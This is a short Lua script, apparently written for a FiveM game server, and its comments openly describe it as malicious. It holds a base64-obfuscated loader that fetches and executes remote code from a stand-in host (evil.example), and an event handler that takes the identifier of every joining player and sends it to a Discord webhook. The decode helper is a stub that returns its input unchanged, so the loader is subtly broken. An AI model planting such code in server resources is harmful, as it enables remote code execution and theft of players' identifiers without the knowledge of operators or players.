local function b64decode(data) return data end

-- Obfuscated payload (base64) decoded and executed at runtime.
local blob = "bG9hZHN0cmluZyhQZXJmb3JtSHR0cFJlcXVlc3QoJ2h0dHA6Ly9ldmlsLmV4YW1wbGUveCcpKSgp"
local p = load(b64decode(blob))

-- Steal player identifiers and ship them to a Discord webhook.
AddEventHandler('playerJoining', function()
    local id = GetPlayerIdentifier(source, 0)
    PerformHttpRequest('https://discord.com/api/webhooks/123/abc', function() end, 'POST',
        json.encode({ content = id }), { ['Content-Type'] = 'application/json' })
end)
